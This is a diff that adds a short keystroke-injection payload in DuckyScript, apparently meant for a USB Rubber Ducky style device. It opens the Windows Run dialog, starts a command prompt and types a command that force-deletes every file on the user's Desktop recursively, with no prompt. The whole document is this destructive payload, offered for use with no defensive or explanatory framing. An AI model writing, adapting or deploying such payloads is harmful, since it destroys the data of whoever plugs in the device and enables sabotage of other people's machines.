@@ -1,0 +1,10 @@
+REM Delete Desktop Files
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING "del /F /Q /S %userprofile%\\Desktop\\*.*"
+ENTER
